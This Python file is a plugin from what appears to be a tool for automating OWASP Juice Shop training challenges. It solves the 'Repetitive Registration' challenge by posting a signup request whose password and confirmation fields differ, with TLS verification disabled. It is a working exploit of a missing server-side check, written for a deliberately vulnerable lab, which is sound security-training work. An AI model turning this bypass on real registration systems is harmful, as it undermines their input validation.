# SOURCE FILE:    repetitive_registration.py
# PROGRAM:        JuiceShop automating attack application -- Plugin
# FUNCTIONS:      Solve REPETITIVE REGISTRATION Challenge
#                 Enter differet passwords in "password" and "passwordRepeat" field but still can successfullt register. 
#          
# DATE:           Dec 6, 2022
# REVISIONS:      N/A
# PROGRAMMER:     Yoyo Wang
#
# NOTES
#--------------------------------------------------------------------------------------

import time
from plugins import attack as a
from plugins import user_generate as usrGen
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#---------------------------------------------------------------------------------------
#Class: repetitive_registration
#Inherit: Attack
#-----------------------------------------------------------------------------------------------
class repetitive_registration(a.attack_inter):

#-----------------------------------------
#FUNCTION: __init__ 
#ARGUMENTS: N/A
#RETURNS: void
#Description: Initial class variables
#-----------------------------------------------------------------------------------------------
    def __init__(self):
        # REST session
        self.juice_session = a.requests.session()
        # url to registrate a new user
        self.url = a.URL + '/api/Users'
        # class used to generate a new user email
        usr = usrGen.new_user_generate()
        # new user email
        self.email = usr.generate_email()
        # moke user password
        self.password = '123456'

#-----------------------------------------
#FUNCTION generator
#ARGUMENTS: N/A
#RETURNS: json_data  --> will be embedded into POST request json field. 
#Description: This function is used to generate needed data from REST requests
#             
#NOTES:
#-----------------------------------------------------------------------------------------------
    def generator(self):
        json_data = {
            'email': self.email,
            'password': self.password,
            'passwordRepeat': "312",
            'securityQuestion': {
                'id': 2,
                'question': 'Mother\'s maiden name?',
            },
            'securityAnswer': 'test',
        }
        return json_data

#-----------------------------------------------------------------------
#FUNCTION run
#ARGUMENTS: N/A
#RETURNS: N/A
#Description: This is the main function for plugin to send REST requests.
#             
#NOTES: None
#-----------------------------------------------------------------------------------------------
    def run(self):
        print("================Start register a new user==============")
        a.logging.basicConfig(filename='./test_logging_info.log', 
                            level=a.logging.INFO, format='%(asctime)s %(message)s')
        a.logging.Formatter.converter = time.gmtime
        logger = a.logging.getLogger("Repetitive Registration")
        a.logging.info(logger)
        a.logging.info('Started')
        json_data = self.generator()
        response = a.requests.post(self.url, json=json_data, verify=False)
        print(response.status_code)
        print(response.text)
        if response.status_code == 201:
            print("Congratulations! You have successfully finished task Repetitive Registration")
            print("Now you can login with user email " + self.email + " and password " + self.password)
            userid = response.json()["data"]["id"]
            return self.email, self.password, userid
        a.logging.info('Finished')
        print("================registration finished==============")









